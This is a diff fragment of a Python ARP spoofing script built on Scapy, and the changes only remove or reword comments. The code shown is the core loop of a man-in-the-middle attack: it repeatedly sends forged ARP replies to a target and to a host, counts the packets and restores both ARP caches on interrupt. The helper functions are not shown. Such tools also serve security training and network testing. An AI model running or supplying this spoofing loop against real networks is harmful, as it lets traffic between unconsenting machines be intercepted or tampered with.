@@ -31,19 +31,16 @@ def ScapyArpSpoofer(target, host, timing, verbose):
 
 
     try:
-        #initializing variables and objects
         info = DeviceInfo()
         target_mac = info.get_mac(target)
         host_mac = info.get_mac(host)
         packets_count = 0
 
-    #main loop
         while True:
             spoofer(target, host, target_mac)
             spoofer(host, target, host_mac)
             packets_count = packets_count + 2
 
-            #displaying info if the verbose flag is True
             if verbose:
                 print(f"[bold green][+][/bold green] Sent to [green]{target}[/green] : [green]{host}[/green] at [green]{scapy.ARP().hwsrc}[/green]")
                 print(f"[bold green][+][/bold green] Packets sent: [green]{packets_count}[/green]")
@@ -51,7 +48,7 @@ def ScapyArpSpoofer(target, host, timing, verbose):
 
             time.sleep(timing)
     
-    #restoring cache before stopping the script
+    #restoring cache before interrupting the script
     except KeyboardInterrupt:
         print("\n[bold yellow][-][/bold yellow] Restoring cache[white]...[/white]")
         restore_cache(target, host, target_mac, host_mac)
